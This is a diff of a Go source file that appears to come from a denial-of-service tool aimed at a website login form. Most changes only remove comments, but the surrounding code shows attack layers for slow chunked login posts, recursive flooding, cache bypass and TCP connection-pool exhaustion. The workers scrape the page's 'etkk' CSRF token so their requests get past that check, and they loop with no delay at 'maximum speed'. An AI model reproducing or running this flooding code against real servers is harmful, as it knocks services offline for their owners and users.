@@ -12,10 +12,8 @@ import (
 	"time"
 )
 
-// CSRF token regex pattern for 'etkk' field
 var csrfTokenRegex = regexp.MustCompile(`name=['"]etkk['"]\s+value=['"]([^'"]+)['"]`)
 
-// fetchCSRFToken fetches the login page and extracts the CSRF token.
 func fetchCSRFToken(client *http.Client, loginURL string) (string, error) {
 	resp, err := client.Get(loginURL)
 	if err != nil {
@@ -55,7 +53,6 @@ func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 		default:
 		}
 
-		// Fetch CSRF token if enabled
 		var csrfToken string
 		if csrfEnabled {
 			token, err := fetchCSRFToken(client, loginURL)
@@ -68,7 +65,6 @@ func layer1Chunked(ctx context.Context, o *Orchestrator, workerID int) error {
 			csrfToken = token
 		}
 
-		// Build body with CSRF token
 		body := slowLoginBodyWithCSRF(csrfToken)
 
 		req, err := http.NewRequestWithContext(ctx, "POST", targetURL, body)
@@ -169,8 +165,6 @@ func layer2Recursive(ctx context.Context, o *Orchestrator, workerID int) error {
 		resp.Body.Close()
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
-
-		// No sleep — maximum speed
 	}
 }
 
@@ -192,7 +186,6 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		default:
 		}
 
-		// Fetch CSRF token if enabled
 		var csrfToken string
 		if csrfEnabled {
 			token, err := fetchCSRFToken(client, loginURL)
@@ -204,7 +197,6 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 			csrfToken = token
 		}
 
-		// Build body with CSRF token
 		var body string
 		if csrfToken != "" {
 			body = fmt.Sprintf("etkk=%s&username=%s&password=%s&capt=%d",
@@ -247,13 +239,11 @@ func layer3CacheBypass(ctx context.Context, o *Orchestrator, workerID int) error
 		resp.Body.Close()
 		o.stats.SuccessRequests.Add(1)
 		o.stats.Layers[layerIdx].Success.Add(1)
-
-		// No sleep — maximum speed
 	}
 }
 
 // ============================================================
-// LAYER 4: AGGRESSIVE TCP POOL EXHAUST (NO WAIT)
+// LAYER 4: AGGRESSIVE TCP POOL EXHAUST
 // ============================================================
 func layer4PoolExhaust(ctx context.Context, o *Orchestrator, workerID int) error {
 	layerIdx := 3
